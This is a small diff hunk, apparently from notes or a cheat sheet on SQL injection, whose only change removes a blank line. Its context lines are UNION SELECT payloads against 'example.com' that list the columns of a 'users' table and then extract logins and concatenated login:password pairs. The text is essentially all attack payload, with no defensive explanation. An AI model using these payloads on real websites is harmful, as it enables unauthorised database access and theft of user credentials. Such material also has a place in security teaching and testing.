@@ -13,4 +13,3 @@
 > example.com union select 1, column_name,3,4 from information_schema.columns where table_name="users" [// column names displayed of table "users"]
 > example.com union select 1, login,3,4 from users[// login info]
 > example.com union select 1, concat(login,0x3a,password),3,4 from users [// userid and password]
-
